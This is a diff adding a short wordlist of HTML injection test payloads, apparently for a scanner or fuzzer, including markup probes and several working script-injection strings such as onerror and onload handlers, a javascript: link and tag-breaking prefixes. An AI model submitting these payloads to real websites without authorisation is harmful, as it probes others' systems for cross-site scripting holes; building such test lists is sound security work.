@@ -1,0 +1,16 @@
+# HTML injection test payloads — one per line.
+# Lines starting with '#' and blank lines are ignored.
+
+<b>hijtest</b>
+<i>hijtest</i>
+<h1>hijtest</h1>
+<marquee>hijtest</marquee>
+<img src=x>
+<img src=x onerror=alert(1)>
+"><b>hijtest</b>
+'><b>hijtest</b>
+</title><b>hijtest</b>
+<svg/onload=alert(1)>
+<a href="javascript:alert(1)">hijtest</a>
+<div style="color:red">hijtest</div>
+&lt;b&gt;hijtest&lt;/b&gt;
